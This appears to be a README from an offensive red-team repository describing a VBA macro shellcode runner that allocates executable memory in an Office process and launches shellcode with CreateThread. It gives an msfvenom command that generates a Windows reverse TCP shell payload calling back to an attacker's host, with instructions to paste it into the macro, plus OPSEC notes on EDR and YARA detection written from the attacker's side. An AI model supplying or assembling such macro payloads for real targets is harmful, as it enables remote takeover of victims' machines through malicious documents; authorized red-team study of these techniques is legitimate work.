# 300 — Create Thread in VBA (Shellcode Runner)

Allocates executable memory in the Office process itself and executes shellcode directly from a VBA macro using `VirtualAlloc` + `RtlMoveMemory` + `CreateThread`.

## What it does

1. Defines a shellcode byte array (`buf`) — **replace with your own generated shellcode**
2. Allocates `PAGE_EXECUTE_READWRITE` (`&H40`) memory with `VirtualAlloc`
3. Copies bytes into the allocation one at a time with `RtlMoveMemory`
4. Executes via `CreateThread` pointing at the base of the allocation

## Generating shellcode

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=<YOUR_PORT> -f vbapplication
```

Paste the resulting `Array(...)` output into the `buf = Array(...)` assignment. Ensure the output uses `vbapplication` format (decimal byte values, not hex strings).

## OPSEC notes

- Self-injection into the Office process is the noisiest possible shellcode delivery path
- `VirtualAlloc` with `MEM_COMMIT | MEM_RESERVE` (`&H3000`) and `PAGE_EXECUTE_READWRITE` (`&H40`) is a near-universal EDR detection signal
- The byte array in source is plaintext — any YARA rule targeting your shellcode family will match it statically
- The placeholder in this file is zeroed — it will not execute
